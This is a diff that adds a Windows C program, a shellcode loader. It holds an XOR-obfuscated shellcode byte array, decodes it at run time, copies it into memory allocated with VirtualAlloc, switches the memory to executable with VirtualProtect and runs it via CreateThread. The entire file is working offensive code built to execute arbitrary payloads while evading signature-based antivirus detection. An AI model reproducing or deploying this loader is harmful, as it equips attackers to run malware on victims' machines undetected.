@@ -1,0 +1,66 @@
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+
+// main code
+int main(VOID){
+
+// shellcode payload
+
+unsigned char shellcode_payload[] = "\xbd\xa9\xc3\x41\x41\x41\x21\xc8\xa4\x70\x81\x25\xca\x11\x71\xca\x13\x4d\xca\x13\x55\xca\x33\x69\x4e\xf6\x0b\x67\x70\xbe\xed\x7d\x20\x3d\x43\x6d\x61\x80\x8e\x4c\x40\x86\xa3\xb3\x13\x16\xca\x13\x51\xca\x0b\x7d\xca\x0d\x50\x39\xa2\x09\x40\x90\x10\xca\x18\x61\x40\x92\xca\x08\x59\xa2\x7b\x08\xca\x75\xca\x40\x97\x70\xbe\xed\x80\x8e\x4c\x40\x86\x79\xa1\x34\xb7\x42\x3c\xb9\x7a\x3c\x65\x34\xa5\x19\xca\x19\x65\x40\x92\x27\xca\x4d\x0a\xca\x19\x5d\x40\x92\xca\x45\xca\x40\x91\xc8\x05\x65\x65\x1a\x1a\x20\x18\x1b\x10\xbe\xa1\x1e\x1e\x1b\xca\x53\xaa\xcc\x1c\x2b\x40\xcc\xc4\xf3\x41\x41\x41\x11\x29\x70\xca\x2e\xc6\xbe\x94\xfa\xa1\x5c\x6b\x4b\x29\xe7\xd4\xfc\xdc\xbe\x94\x7d\x47\x3d\x4b\xc1\xba\xa1\x34\x44\xfa\x06\x52\x33\x2e\x2b\x41\x12\xbe\x94\x22\x20\x2d\x22\x6f\x24\x39\x24\x41\x41";
+
+
+// shellcode length
+unsigned int shellcode_length=sizeof(shellcode_payload);
+
+
+// xor key
+char key='A';
+
+// xor the shellcode
+for (int i = 0; i < shellcode_length-1; i++)
+{
+   shellcode_payload[i]=shellcode_payload[i]^key;
+}
+
+
+
+
+// allocate the memory
+LPVOID memory_address=VirtualAlloc(
+    NULL,
+    shellcode_length,
+    MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE
+);
+
+// load the shellcode in the memory
+
+RtlMoveMemory(
+    memory_address,shellcode_payload,shellcode_length
+);
+
+// make shellcode executable
+DWORD old_protection=0;
+BOOL returned_vp= VirtualProtect(
+    memory_address,
+    shellcode_length,
+    PAGE_EXECUTE_READ,
+    & old_protection
+);
+
+// execute thread
+if(returned_vp!= NULL){
+    HANDLE thread_handle= CreateThread(
+        NULL,
+        NULL,
+        (LPTHREAD_START_ROUTINE) memory_address,
+        NULL,NULL,NULL
+    );
+
+    // wait for thread to complete
+    WaitForSingleObject(
+        thread_handle,
+        INFINITE
+    );
+}
+}
